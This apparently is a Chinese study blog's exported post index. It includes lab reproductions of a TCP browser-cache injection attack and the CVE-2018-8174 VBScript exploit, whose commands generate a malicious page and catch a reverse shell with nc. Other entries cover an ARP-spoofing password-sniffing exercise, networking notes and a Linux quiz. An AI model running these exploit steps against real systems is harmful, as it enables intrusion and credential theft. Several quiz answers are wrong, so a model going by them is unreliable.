在攻击过程中，TCP接收窗口大小会随着我们不断请求图像而增长。 根据客户端可以实现的最大窗口大小，您需要在文件tcp_exploit / server / src / main.c中的第316行调整以下内容 ​ #define SEQ_WINDOW MAX_WINDOW_SIZE &lt;&lt; 2where MAX_WINDOW_SIZE is the maximum window size representing the available space at the receiver’s side. 其中MAX_WINDOW_SIZE是表示接收方可用空间的最大窗口大小。 Set up environment（设置环境）In order to set up the environment, we need one windows machine as the victim and one linux machine as the attacker. Our target website is www.cnn.com. 为了建立环境，我们需要一台Windows机器作为受害者，一台Linux机器作为攻击者。 我们的目标网站是“www.cnn.com”。 Network Topology:（网络拓扑结构） 123Attacker -------wire----------| Router ---------wireless-------Victim (client)Server -------wire----------| On the attacker’s machine, run the commands below:（在攻击者的计算机上，运行以下命令：） 12345678910112.1 cd tcp_exploit/server2.2 sudo sh iptables.sh2.3 cd tcp_exploit/server/src2.4 sudo ./server2.5 cd tcp_exploit/client/src2.6 sudo python -m SimpleHTTPServer 80 (Alternatively, you can access to the malicious code (i.e., tcp_exploit/src/index.html) without setting up the HTTP server if you open the html file in browsers locally.) How to conduct experiment（如何进行实验）123453.1 Launch Chrome and then access to the malicious website (http://attacker's IP address or file:///Path_to_the_dir/tcp_exploit/client/src/index.html)（启动Chrome然后访问恶意网站（http：//攻击者的IP地址或文件：///Path_to_the_dir/tcp_exploit/client/src/index.html））3.2 After the attack program finishes, you can access to the victim's website (i.e. www.cnn.com) to see whether the attack has successfully injected a page cached on the browser.（攻击程序完成后，您可以访问受害者的网站（即www.cnn.com），查看攻击是否已成功注入浏览器缓存的页面。） Disclaimer（免责声明）This is a reasearch-oriented project. Anyone using it should be aware of the potential risks and responsible for his/her own actions. （这是一个以研究为导向的项目。 使用它的任何人都应该意识到潜在的风险并对自己的行为负责。）]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络四]]></title>
    <url>%2F2019%2F08%2F24%2F%E7%BD%91%E7%BB%9C%E5%9B%9B%2F</url>
    <content type="text"><![CDATA[1.网络层：把数据帧转换为数据包，实现基于IP地址的寻址和转发。 网络层的设备：路由器 网关的作用：当PC想跨网段通信的时候，所有不知道的数据包，都交给网关来处理。 2.路由器的作用： （1）实现不同网段的通信； （2）隔离广播域； 路由器的每个接口=一个网段=一个广播域 （3）为数据包寻找一条最优路径。 3.路由器的工作原理：源目IP地址不变，源目mac地址被重写。 注意：mac地址（全球唯一性）是二层的概念，是不能跨网段的。 当PC1（192.168.1.1）—-PC3（192.168.2.1）通信的时候 （1）PC1先查看自己的ARP表；如果有就直接发送；如果没有，就需要进行判断。PC1先判断目标主机和自己是否在相同的网段：如果在同一个网段，直接发送ARP请求（广播）；如果没有在相同的网段，就要把数据包发送给网关； Source源： 192.168.1.1 PC1的mac地址 Destination目标：192.168.2.1 PC1网关的mac地址 （2）路由器：根据目标mac地址判断是不是找我的，是找我的我就回复；不是找我的，我就丢弃。如果是找我的，我就把数据帧还原成数据包，根据目标IP地址查看“路由表”，做转发。 路由器把到达192.168.2.1的数据包从f0/1接口发送出去。 Source： 192.168.1.1 PC3网关的mac Destination： 192.168.2.1 PC3的mac地址 （3）PC3的反应；给PC1回复数据包。 Source： 192.168.2.1 PC3的mac地址 Destination目标：192.168.1.1 PC3的网关mac （4）路由器：目标Mac是找我的，我就“拆包”，看到里边的目标Ip；根据目标IP进行路由表的查找，从相应接口发送出去。 Source： 192.168.2.1 PC1的网关mac Destination目标：192.168.1.1 PC1的mac地址 4.常用配置： （1）交换机的远程登录配置： 第一步：配置IP SW1(config)#int vlan 1 SW1(config-if)#ip add 192.168.1.100 255.255.255.0 SW1(config-if)#no sh SW1(config-if)#exit 第二步：配置telnet SW1(config)#line vty 0 4 SW1(config-line)#pass SW1(config-line)#password 123456 SW1(config-line)#login SW1(config-line)#exit 第三步：配置特权模式的密码 SW1(config)#enable password 123456 SW1(config)#no ip domain lookup //关闭域名解析 SW2(config)#ip default-gateway 192.168.2.254 //给交换机配置网关，实现跨网段通信 常用排错命令： R1(config)#do show ip int bri //查看接口状态和IP R1(config)#do show ip route //查看路由表 R1(config)#do show run //查看当前配置 （2）路由器的telnet配置： 第一步：给路由器接口配置IP R1(config)#int f0/0 R1(config-if)#ip add 192.168.1.254 255.255.255.0 R1(config-if)#no sh 第二步：配置telnet R1(config)#line vty 0 4 R1(config-line)#password 123456 R1(config-line)#login R1(config-line)#exit R1(config)#enable password 123456 （3）路由器接口是三层接口，可以直接配置IP； Router(config)#int f0/1 Router(config-if)#ip add 192.168.2.254 255.255.255.0 Router(config-if)#no sh （4）查看路由表： Router(config-if)#do show ip route C 表示connected，直连路由，成立的条件只要接口处于up状态，路由器就会自动把直连路由加载到路由表里。 （5）清空配置： erase startup-config //清空当前配置 reload //重启后才生效5.路由协议：路由器之间交流使用的语言。 路由协议分为动态路由协议和静态路由协议（由管理员来配置）。 基本格式： ip route 目标网段 目的子网 下一跳（直连链路的对端地址）]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络三]]></title>
    <url>%2F2019%2F08%2F24%2F%E7%BD%91%E7%BB%9C%E4%B8%89%2F</url>
    <content type="text"><![CDATA[1.网络层：把数据帧转换为数据包，实现基于Ip地址的寻址和转发。 数据帧：在数据外边加入二层头部（帧头和帧尾） Dmac（6Byte）+Smac（6Byte）+Type（2Byte）+Data +FCS（4Byte，帧尾） 数据包：三层IP头部+数据 2.IP头部：标准长度是20Byte。 TTL：time to live 生存时间，是一个三层防环机制，可以限制一个数据包在网络中传输的时间。 数据包每经过一个三层设备（路由器），他的TTL值就会减1，如果TTL=0，那么这个数据包就不能继续传输，会被丢弃。 每经过一个三层设备，叫做1跳。 Protocol：用来标识上层协议，如果是UDP=17；TCP=6；ICMP=1. Source IP Destination IP 3.ARP：Address Resolution Protocol地址解析协议，用来根据Ip地址解析mac。 ARP报文分为2类：ARP请求报文Request；ARP响应报文Reply。 ARP请求报文是以广播的形式发送；ARP响应报文是以单播的形式回复。 arp -a //查看arp缓存信息 arp -d //清除ARP缓存 4.ICMP：（Internet Control Message Protocol）互联网控制报文协议，是一个“错误侦测与回馈机制”，用来测试网络连通性。 ICMP报文类型分为2种：Request请求报文和Reply回复报文。 ping是一个工具/命令，利用的是ICMP协议。 ping的常用参数： ping www.baidu.com -t //长ping，只能按Ctrl+C停止 ping -a 192.168.120.250 //-a解析主机名 ping -l 1000 www.baidu.com //-l指定测试数据包的大小；指定为1000个字节 ping -n 6 www.baidu.com //-n指定发送数据包的个数为6 ping -i 5 www.baidu.com //-i指定TTL值（每经过一个路由器减1，如果TTL=0就不能再继续传输） ping -l 1501 -f www.baidu.com //指定发送的数据包为1501，-f表示不允许分片ARP欺骗:交换机的工作原理是广播，对用户的身份没有验证功能 ARP欺骗：欺骗所有主机（告诉所有客户端假的网关mac地址）；中间人攻击（欺骗两个通信主机，获取他们的通信数据） （1）实验说明： 3台虚拟机，连接到VMNET1, windows7(客户端)——&gt;攻击者——&gt;server 2008 192.168.1.1 192.168.1.2 192.168.1.3 修改各个主机的Ip地址，并且测试是否能通信。（注意防火墙的问题） （2）在攻击者的主机上安装Cain软件 Cain——————&gt;Sniffer————&gt;开始嗅探————&gt;右键————&gt;Scan mac address 下边ARP——————&gt;加号——————&gt;找左边是欺骗对象，右边是欺骗的条目——————&gt;左上角低三个黄色图标，开始ARp欺骗。 （3）在Server 2008 上安装FTP并配置 第一步：添加角色——————&gt;WEB服务——————&gt;FTP服务 第二步：创建目录ftproot，目录下创建两个文件夹 down up 第三步：创建对应的用户，mengzhu和tianxiao 第四步：编辑文件夹的权限，并设置mengzhu给予下载权限；tiaoxiao给予上传的权限。 第五步：在IIS里创建FTP站点即可。 补充FTP的隔离用户目录结构： ftproot(FTP的主目录，可以自定义) ————localuser（不能修改） ————mengzhu（文件夹和用户一定要同名） ————tiaoxiao（只有tianxiao有权限查看和管理） ————public（匿名用户，可以访问的目录） 创建FTP的时候，指定根目录为ftproot，修改ftp用户隔离为（用户名目录勾选，应用） （4）在Windows 7 （客户端）进行访问并测试 在攻击者的主机上，查看是否有passwords（左下角第4个），如果有密码就证明获取密码成功。 6.Telnet：远程登录管理方式，使用的端口号是TCP-23。 （1）在2008里添加“功能”—–》telnet服务端和客户端 （2）使用services.msc 打开服务，开启telnet （3）在Windows7上使用命令行来登录telnet telnet 192.168.1.3 d: //切换到d盘 echo 123456 &gt; telnet.txt //在被控制主机上创建一个文件 type telnet.txt //查看telnet文件内容]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络二]]></title>
    <url>%2F2019%2F08%2F24%2F%E7%BD%91%E7%BB%9C%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[重点：交换机的工作原理、交换机的简单配置 1.OSI七层模型： （1）物理层：定义了终端设备的传输介质，传输的是bit流。 （2）数据链路层：把bit转换为数据帧，实现基于mac地址的寻址和转发 （3）网络层：把数据帧转换为数据包，实现基于IP地址的寻址和转发 （4）传输层：把数据包转换为数据段，为数据提供可靠或者不可靠的传输，为应用程序提供端到端的服务 （5）会话层：建立、维持和管理、终止会话 （6）表示层：数据的表现形式，比如压缩、加密、 （7）应用层：为用户提供服务。 2.数据链路层：把bit转换为数据帧，实现基于mac地址的寻址和转发 （1）Mac地址：是由48 bit的二进制数组成，为了读写方便，用十六进制表示。 其中前24bit表示厂商信息，后24位表示设备信息，由厂家自定义。 mac地址是由厂家出厂的时候直接烧录到网卡里，一般情况下不能修改。 （2）Mac地址的分类： 单播mac：如果一个Mac地址的第8bit是0，那么这个mac地址表示单播mac。 组播mac：如果一个Mac地址的第8bit是1，那么这个mac地址表示组播mac。 广播mac：全FF-FF-FF-FF-FF-FF （3）数据帧格式：EthernetII数据帧 二层数据帧最大1518Byte == 6Byte的Dmac+ 6Byte Smac+ 2Byte（Type字段：标识上层协议） + 数据Data（最大1500Byte） +4Byte（帧校验：FCS） 3.交换机的工作原理： ARP协议可以根据IP地址找MAC地址（1）pc1想和pc3通信，先查看自己ARP表项目，如果有就直接发送数据；如果没有就发送广播，以ARP广播的形式发送出去。 source：192.168.1.1 M1 destination：192.168.1.3 FF （2）交换机：学习/转发 学习：把pc1的MAC地址放到MAC地址表中； 转发：目标地址为全FF，广播到除源端口意外的所有端口； （3）反应： 如果是来找我的就恢复；如果不是找我的，我就丢弃。 pc3回复的报文,以单播的形式回复 source： 192.168.1.3 M3 destination：192.168.1.1 M1 （4）交换机：学习/转发 学习：把pc3的MAC地址存储到自己的MAC地址表中； 转发：收到单播的数据包，查找自己的MAC地址表中记录，直接单播给pc1; 4.真实设备连接： （1）设备的console口————console线————PC的USB口 （2）在真机里安装USB-COM口的驱动 （3）计算机——管理——设备管理——端口，找到驱动起来的接口编号 （4）真机里安装远程管理的软件：Xshell/SecureCRT/Putty 5.交换机的组成： （1）CPU：用于运算和控制 （2）ROM：Read Only Memory，只读存储，存储的系统的引导文件====》类似于引导分区 （3）RAM：Random Access Memory，随机存储，相当于内存====》running-config （4）Flash：闪存，用于存放IOS（路由器或者交换机的系统）系统，也可以存放用户数据。=====》类似于C盘。 （5）NVRAM：非易失性存储，为数据做永久存储。=====》类似于硬盘。 6.交换机的常见模式： Switch&gt;en //用户模式，只能使用一些简单的命令；不能查看当前配置。 Switch# //特权模式，可以使用比较多的查看命令。 Switch#conf t //全局配置模式，修改交换机的配置 Enter configuration commands, one per line. End with CNTL/Z. Switch(config)# 退出模式：exit 直接退到特权模式：end == Ctrl + z 快捷键：ctrl+a 移动到行首 ctrl+e 移动到行尾 ctrl+u 清空行 Ctrl+shift+6 7.特权模式常用命令： 所有的show命令都可以在特权模式下直接使用；如果是其他模式，要加do。 （1）Switch#show ip interface brief ==show ip int bri //查看所有接口的状态和配置 Status表示接口的物理状态，是否手动就行了修改；Protocol表示链路的协商状态是否正常。 说明：只有2个状态都是up的时候才是正常的。 Interface IP-Address OK? Method Status Protocol FastEthernet0/1 unassigned YES manual up up （2）show int f0/6 // 接口支持简写，fastethernet简写为f0/1 ;Ethernet简写为 e0/1;Gi 简写为g0/1; 查看物理接口的双工和速率 Full-duplex, 10Mb/s //duplex表示双工模式，如果是Full表示全双工；如果是half表示半双工；如果是auto表示自适应。 （3）修改接口的双工和速率 enable conf t int f0/1 speed 10/100/auto //修改接口的速率 duplex half/full/auto //修改接口的双工模式 （4）SW1#show mac-address-table //查看mac地址表，Type类型为Dynamic，表示交换机自己学到的。 SW1#clear mac-address-table #清空mac地址表 （5）其他命令： SW1#clock set 17:07:30 May 14 2019 #设置时间：时分秒，月日年 SW1#show history #查看命令历史 SW1#show running-config #查看交换机当前配置，还没有保存（重启就失效；只是写入了“内存”）(**) SW1#write #保存配置 Building configuration… [OK] SW1#copy running-config startup-config #把running里的配置保存到开机启动配置文件里 SW1#show startup-config #交换机每次开机的时候会自动加载的配置（重启仍然有效；写到了“硬盘”中，做永久存储） SW1#reload #重启 8.远程登录的配置：（1）设备管理——本地管理和远程管理（通过网络来管理设备，常用的方式有Telnet、SSH、远程桌面、远程协助、Team View等） （2）远程管理的步骤： 第一步：给交换机配置IP SW1(config)#interface vlan 1 //进入虚拟接口； SW1(config-if)#ip address 192.168.1.100 255.255.255.0 //配置IP SW1(config-if)#no sh //激活接口 ​ 第二步：配置telnet​ SW1(config)#line vty 0 4 #0表示第1个虚拟接口；4表示最多允许登录人数​ SW1(config-line)#password 123456 #设置远程登录的密码​ SW1(config-line)#login #激活 ​ 第三步：进入特权模式的密码​ SW1(config)#enable password enable #password表示的明文密码​ SW1(config)#enable secret enable2 #secret表示密文的密码；如果两个都存在，那么密文生效 （3）给console口做安全配置===》本地的安全 SW1(config)#line console 0 SW1(config-line)#exec-timeout 0 0 #设置超时时间，第一个0表示分钟；第二个0表示s；0 0 表示永不超时（仅限于实验环境） SW1(config-line)#password console #设置console的登录密码 SW1(config-line)#logging synchronous #设置光标跟随，不让命令被日志信息打断 SW1(config-line)#login #激活 SW1(config)#no ip domain-lookup #关闭域名解析 SW1#erase startup-config #清空所有配置 （4）其他命令 SW1(config)#do copy r s== do write #保存 Switch#show version #查看系统版本 （5）ssh配置 开启SSH（基于本地用户进行身份验证）： conf t hostname SW1 //设置主机名 username test password 密码 //设置登录的用户名和密码 ip domain-name www.test.com //配置域名，域名用来生成公钥和私钥 crypto key generate rsa //生成一对rsa算法的公钥和私钥 line vty 0 4 transport input ssh/all login local exit ssh -l test 192.168.1.254 //在模拟PC上使用ssh连接设备 destination 目标Source 源Current 当前configuration 配置Status 状态 Protocol 协议Dynamic 动态minutes 分钟seconds 秒generate 生成]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络一]]></title>
    <url>%2F2019%2F08%2F24%2F%E7%BD%91%E7%BB%9C%E4%B8%80%2F</url>
    <content type="text"><![CDATA[ISP:运营商，电信、移动、联通IEEE：国际电子电气工程师协会，致力于电气、电子、计算机工程和与科学有关的领域的开发和研究，在太空ISO（国际标准化组织）网络设备：交换（实现相同网段通信）和路由器（找路，实现不同网段通信）IP：标识网络中任意一台主机的位置（收发件人的地址） 1.网络：两个不在同一地理位置的主机，通过传输介质和通信协议，以实现资源共享和数据传输。 （1）传输介质： （2）通信协议：“语言”，设备之间交流使用的语言叫做“协议” （3）资源共享：文本类、视频、音频、图片等 （4）终端：笔记本、台式机、平板、手机等2.网络的分类：按照范围分 （1）WAN（Wide Area Network）：广域网，典型代表Internet，还有VPN（虚拟私有网络–“隧道”） （2）LAN(Local Area Network)：局域网，“内网”，比如：家庭网、企业网、园区网等 （3）MAN：城域网 3.网络拓扑：是一个网络的架构描述；方便管理和查看网络结构。 星型：组网灵活、方便扩展和管理；但是中心节点一旦发生故障，就会全网瘫痪。 全网型拓扑：每个设备都和其他设备相连，任意一个节点坏掉都不影响其他设备的通信。 缺点：成本太高。 部分网状型：有2个（或以上）性能比较好的设备来做“冗余（多余）”，防止网络故障。 4.OSI七层参考模型：由ISO组织提出的OSI七层模型。 最开始的网络厂商是不兼容的，不能直接对接。 为了促进各厂商的融合，ISO组织提出了OSI（Open System Interconnection，OSI）七层模型 OSI七层就是定义了数据在传输过程中如何进行“封装”（打包）和“解封装”（拆包） （1）物理层：定义了终端设备的传输介质。传输的是bit流。 （2）数据链路层：把bit流转换为数据帧，实现基于mac地址的寻址和转发。 （3）网络层：把数据帧转换为数据包，实现基于IP地址的寻址和转发。 （4）传输层：把数据包转换为数据段，为数据提供可靠或者不可靠的传输；为应用程序提供端到端的服务。 netstat -an //查看端口和连接情况 （5）会话层：用来建立、维持、管理和终止会话 （6）表示层：数据的表现形式，比如加密和压缩 （7）应用层**：为用户提供服务。 5.TCP/ip模型：也叫做TCP/IP协议栈。可以说是4层，也可以说是5层 4层： 网络接口层：物理层和数据链路层 网络层：把数据帧转换为数据包，实现基于IP地址的寻址和转发。 传输层：把数据包转换为数据段，为数据提供可靠或者不可靠的传输；为应用程序提供端到端的服务。 应用层：把会话、表示层和应用层合并为一层。 1.物理层：定义了终端设备的传输介质。传输的是bit流。 常见的物理介质：网线、光纤、同轴线缆2.以太网中的术语 （1）广播：一对多；讲课 （2）组播：一对多，只有同一组里的主机才能接收到；群聊 （3）单播：一对一 （4）全双工：同一时刻，可以同时进行发送（上传）和接收（下载），比如手机 （5）半双工：同一时刻，只能发送或者接收数据，比如对讲机 （6）单工：只能进行单向传输，比如收音机 （7）冲突域：一个冲突影响的范围就是冲突域。 （8）广播域：一个广播影响的范围就是广播域。 3.同轴线缆：传输速度快，但是只有一根芯，半双工的工作模式。 应用：电视、监控等 同轴线缆：100Base-2（细线，理论上可以传输185m）和100Base-5（粗线，理论上可以传输500m） 4.光纤：单模光纤和多模光纤 单模光纤：只能传输一种光，传输距离更远 多模光纤：可以传输多种光。 5.网线：在以太网中常见的传输介质，网线的理论值能传输100M。 （1）从结构上来分：屏蔽双绞线（有锡纸，适合室外布线）和非屏蔽双绞线（适合室内布线） （2）从传输速率来分： CAT5:5类线，传输速率的100M（百兆以太网） cat6:6类线，传输速率为1000M（千兆以太网） CAt7:7类线或者超6类，传输速率为10G（万兆以太网） （3）按照网线的排序：T568A和T568B T568B：橙白、橙、绿白、蓝、蓝白、绿、棕白、棕 T568B在100M以太网中，使用了4根，1,2用于发送；3,6用于接收。 T568A是1,3对调；2,6对调； （4）按照一根线的两端网线的连接方式： 如果一根线的两端都是T568B，这种线叫做“直通线”——————不同种设备之间用直通线 如果一根线一端是T568B，一端是T568A，这种线的连接方式叫做“交叉线”————同种设备之间用交叉线 全反线，也叫做Console线，用来对设备进行配置。 6.不管是什么传输介质，在传输数据的时候，信号都会出现衰减，这个时候需要使用设备来延长信号的传输距离物理层的设备：hub（集线器），只能识别bit流。 由于内部是总线型结构，网络的传输效率特别低。 hub没有学习功能； hub的每个接口都是一个冲突域； 带宽：单位时间内传输数据的速度默认单位：bit/s计算机最开始的时候只能识别0和1.每个0或1就是一个bit（位）。为了方便计算机读取，把每 8 bit==1 Byte（容量单位）。1Byte=8bit1KB==1024B1MB=1024KB1GB=1024MB1TB=1024GB一个2G（GB）电影，使用100M（bit/s）的带宽，需要多长时间下载完成？2*1024=2048MB100/8=12.5B/s 2.73min 1.进制：二进制B ： 0 1八进制O ： 0 1 2 3 4 5 6 7十进制D ： 0 1 2 3 4 5 6 7 8 9十六进制H ：0 1 2 3 4 5 6 7 8 9 A（10） B（11） C（12） D（13） E（14） F（15） 2.把1-F转换为二进制： 十六进制 二进制 0 0 1 1 2 10 3 11 4 100 5 101 6 110 7 111 8 1000 9 1001 10 1010 11 1011 12 1100 13 1101 14 1110 15 1111 3.十进制转其他进制：短除法 把这几个数转换为二进制 128=10000000 192=11000000 224=11100000 240=11110000 248=11111000 252=11111100 254=11111110 255=11111111 2的0次方=1 2的1次方=2 2的2次方=4 2的3次方=8 2的4次方=16 2的5次方=32 2的6次方=64 2的7次方=128 2的8次方=256 2的9次方=512 2的10次方=1024 十进制转八进制： 479 640 1200 1200 2260 1024 2000 512 1000 十进制转十六进制： 1600 640 3216 C90 4801 12C1 2048 800 4.其他进制转十进制：乘法十六进制：ABC B00八进制： 501 234二进制： 1 0 1 0 1 0 0 0 =168 128 64 32 16 8 4 2 1 5.IP地址：分别是Ipv4和Ipv6. （1）其中IPv4是由32位的二进制数组成，为了读写方便，用点分十进制表示。IPV4的地址空间是42亿。IPv6是由128位的二进制数组成，为了读写方便，用冒号分十六进制表示。 （2）IPv4中按照用途把地址分为2大类：公网地址和私网地址 公网地址：是互联网上使用，具有全球唯一性。 私网地址：在以太网中可以重复使用。 10.0.0.0————10.255.255.255 子网掩码：255.0.0.0（简写10.0.0.0/8，这里的8代表子网中“1”的个数） 172.16.0.0————172.31.255.255 子网掩码：255.255.0.0 192.168.0.0————192.168.255.255 子网掩码：255.255.255.0 （3）IP地址的分类： A类：1——126，默认子网掩码是255.0.0.0；地址范围：1.0.0.0————126.255.255.255 B类：128——191，默认子网掩码是255.255.0.0；地址范围：128.0.0.0————191.255.255.255 C类：192——223，默认子网掩码是255.255.255.0；地址范围：192.0.0.0————223.255.255.255 D类：224——239，用于组播 E类：240——255，用于科研 （4）子网掩码：用来标识Ip地址中的网络位和主机位的。 网络位：在Ip地址中，与子网掩码“1”（二进制）对应的是网络位 主机位：在Ip地址中，与子网掩码“0”（二进制）对应的位是主机位。 **网络地址：在Ip地址中，如果“主机位”全为0，这个地址就是网络地址。====》路由器找路的时候使用 广播地址：在Ip地址中，如果“主机位”全为1，这个地址就是广播地址。====》同一个网络中广播的时候使用 说明：网络地址和广播地址不能直接在网络中进行配置。** 6.家用路由器的基本功能； （1）路由的功能：为数据包寻找一条最优路径；————找路 （2）地址转换功能：把私网地址转化为公网地址；————WAN口（宽带的用户名和密码校验成功，才会给用户分配公网Ip） （3）DHCP功能：为客户端分配Ip/子网/网关/DNS 数据链路层的代表设备：交换机]]></content>
      <tags>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE20188174-双杀0day漏洞复现]]></title>
    <url>%2F2019%2F08%2F20%2F%E5%8F%8C%E6%9D%80Oday%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞描述：CVE-2018-8174是Windows VBScriptEngine 代码执行漏洞，由于 VBScript 脚本执行引擎(vbscript.dll)存在该漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户受诱导或不慎点击恶意链接或文档，攻击者便可远程获取当前用户系统权限，进而完全控制用户电脑。 2018年4月18日国内某信息安全公司监控到一例使用该漏洞的攻击活动后，当天与微软公司沟通，将相关信息提交到微软。微软在4月20日确认此漏洞，于5月8号发布了官方安全补丁对其进行修复，并将其命名为 CVE-2018-8174，在国内该漏洞则被称为“双杀”漏洞。 复现过程攻击机：KALI IP：192.168.20.128 靶机：Win7 IP：192.168.20.129 #仅以网站点击恶意链接获取权限方法验证该漏洞 git clone https://github.com/Sch01ar/CVE-2018-8174_EXP #root@kali:~# git clone https://github.com/Sch01ar/CVE-2018-8174_EXP 生成带有恶意VBscript的html页面和word文档python CVE-2018-8174.py -u http://192.168.20.128/exploit.html -o msf.rtf -i192.168.20.128 -p 4444 root@kali:# cd CVE-2018-8174_EXP/root@kali:/CVE-2018-8174_EXP# python CVE-2018-8174.py -u http://192.168.20.128/exploit.html -o msf.rtf -i192.168.20.128 -p 4444UNICODE_URL len 138 , need to pad …Generated msf.rtf successfully!!! Completed !!! -u：URL 地址 -o：生成文档 -i：监听地址 -p：监听端口用 nc 监听 4444 端口： 生成后ls查看当前目录下的文件 确保所需要的文件完整 root@kali:~/CVE-2018-8174_EXP# lsCVE-2018-8174.py exploit.html msf.rtf README.md 将explot.html复制到/var/www/html路径下，并开启apache服务 root@kali:~/CVE-2018-8174_EXP# cp exploit.html /var/www/html root@kali:~/CVE-2018-8174_EXP# service apache2 start nc指令，用于监听4444端口 root@kali:~/CVE-2018-8174_EXP# nc -lvvp 4444listening on [any] 4444 … 开始监听后，我们用靶机，也就是windows7浏览器打开攻击机生成的恶意链接： 用靶机的 IE 浏览器打开恶意 URL：192.168.20.128/exploit.html 靶机点开这个连接会直接反弹shell,攻击机已经拿到靶机的系统权限 192.168.20.129: inverse host lookup failed: Unknown hostconnect to [192.168.20.128] from (UNKNOWN) [192.168.20.129] 49293Microsoft Windows [�汾 6.1.7601]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ���� C:\Users\haha\Desktop&gt; 实验完成]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux内侧]]></title>
    <url>%2F2019%2F08%2F17%2FLinux%E5%86%85%E4%BE%A7%2F</url>
    <content type="text"><![CDATA[解释/etc/sdb5和/dev/sdb2分别是什么意思答：/etc/sdb5 表示第二块硬盘的第一个逻辑分区/etc/sdb2 表示第二块硬盘的第二个主分区 linux操作系统的启动过程答：：Linux操作系统的启动过程一般分为四个阶段，分别为BLOS启动引导阶段、GRUB启动引导阶段、内核阶段、int初始化阶段 Linux的运行级别分别代表什么意思?答：Linux运行级别：0： 关机1： 单用户2： 无网络的多用户3： 命令行模式4： 未用5： GUI（图形桌面 模式）6 ： 重启运行级别的切换：init 想要切换的运行级别 将hpptd服务设置为开机自启动和开机自动关闭的命令答：chkconfig –add httpd 添加httpd服务的开机自动启动功能chkconfig –del httpd 删除httpd服务的开机自动启动功能 写出以下命令: (1) 长格式友好显示home目录的详细属性信息答：ls –lh /home (2) 查看指定目录的所占空间答：du指定目录 (3) 一次性创建嵌套多层目录答：mkdir –p 创建目录层次 (4) 给源文件xx.txt创建一个软连接,名为/aa.txt答：ln –s xx.txt /aa.txt ###### (5) 将/home/hack目录内的所有内容(包括子目录)复制到/hack/ 答：cp /home/hack /hack/ ###### (6) 将文件重命名 答：mv 原文件名 修改后的文件名 ###### (7) 在系统中查找所有A字母大头的txt文件 答：ls –l A*.txt ###### (8) 查看/etc/passwd文件的最后三行和前三行(两条命令) 答：hard -3 /etc/passwd 查看/etc/passwd文件的前三行 tail -3 /etc/passwd 查看/etc/passwd文件的最后三行 ###### (9) 一次性创建aa ab ac ad四个文件 答：touch file {aa，ab，ac,ad} ###### (10) 统计/etc/shadow文件总共有多少行 答：wc –l /etc/shadow ###### (11) 过滤掉/etc/yum.conf文件中#号开头的行和空行 答：grep –v “#” etc/yum.conf | grep “^$” ###### (12) 将/etc/tpm/* 压缩归档问xx.tar/gz 答：tar zxfv xx.tar/gz /etc/tpm/* ###### (13) 将xx.tar.gz这个文件解压到/test/ 答：tar –xf xx.tar.gz /test/ ###### (14) 再次执行最近v开头的命令 答：!v 写出vi编辑器的模式以及相关指令分别是什么意思答：vi编辑器存在三种模式，分别是命令模式、输入模式、末行模式。在命令模式输入i、o、a进入输入模式从输入模式按esc键进入命令模式从命令魔兽按：进入末行模式，在末行模式输入wq保存退出，按q！强制退出 临时关闭防火墙和selinux以及永久关闭的命令答：systemctl stop firewalld 临时关闭防火墙Vim /etc/sysconfig/selinux 将其中的SELINUX=enforcing改为disabled 重启reboot 即可永久关闭selinux 查看postfix软件包的配置文件位置?答：cat etc/postfix 查看是否安装了elinks软件包答：1、rpm包安装的，可以用rpm -qa看到，如果要查找某软件包是否安装，用 rpm -qa | grep “软件或者包的名字”。2、以deb包安装的，可以用dpkg -l能看到。如果是查找指定软件包，用dpkg -l | grep “软件或者包的名字”；3、yum方法安装的，可以用yum list installed查找，如果是查找指定包，命令后加 | grep “软件名或者包名”；4、如果是以源码包自己编译安装的，例如.tar.gz或者tar.bz2形式的，这个只能看可执行文件是否存在了，上面两种方法都看不到这种源码形式安装的包。如果是以root用户安装的，可执行程序通常都在/sbin:/usr/bin目录下。 从所有rpm安装的包中过滤出samba答：rpm ql |grep samba 如何从光盘安装lynx-2-8.8-0.3.dev15.el7.x86_64.rpm包答： 1、挂载光盘：mount /dev/sr0 挂载点2、进入挂载点，cd Paskage3、安装 rpm-ivh lynx-2-8.8-0.3.dev15.el7.x86_64.rpm 编译安装的过程(四个步骤)答： 1、获取源码包并解压 2、进入解压目录3、make 编译二进制文件4、make install 软件安装 与用户账户相关的两个文件分别是?(写出文件的绝对路径)答：用户账号文件： /etc/passwd影子文件（密码和账号信息）： /etc/shadow 创建用户aa 指定家目录/aa 指定基本组为jishubu 附加组为bj答：useradd aa –d /aa –g jishubu –G bj 给aa用户设置密码答：passwd aa 新密码 写出锁定用户aa 查看用户aa是否锁定 解锁用户aa的命令答：锁定用户：passwd –l aa查看aa是否被锁定：passwd –S aa解锁用户aa：passwd –u aa 删除用户aa以及家目录答：userdel –r aa 给ls -l设置别名为ck答：alias ck =“ls -l” 将aa bb 用户加入root组答：Gpasswd –a aa，bb root 将hanmeimei加入jishubu组答：Gpasswd –a hanmeimei jishubu 将jishubu组删除答：groupdel jishubu 查询hanmeimei用户都属于那些组答：Groups hanmeimei 查询root用户的UID和GID信息答：id root 查询当前主机登录用户情况答：who 将/test目录的属组权限增加写入权限,属组去掉读取权限,其他用户增加执行权限.答：chmod g+w,g-r,o+x /test 写出755代表什么意思 将/test/aa.txt文档的文件设置为755的命令答：755表示属主可以读取写入执行，属组可以读取和执行，其他人可以读取和执行Chmod 755 /test/aa.txt 将/test目录属主设置为aa 属组设置为jishusbu答：chown aa：jishubu /test 将/test目录的权限设置为:属主-读写执行/属组-读写执行/其他人-读取执行答：chmod 775 /test 写出新添加的一块硬盘/dev/sdb分区并能正常使用的整个流程以及相关关键命令答：1、fidsk-l 查看硬盘状态2、fidsk /dev/sdb 进入磁盘管理页面进行分区3、mkfs.xfs /dev/sdb 对分区格式化制作文件系统 写出动态查看 静态查看 查看指定程序 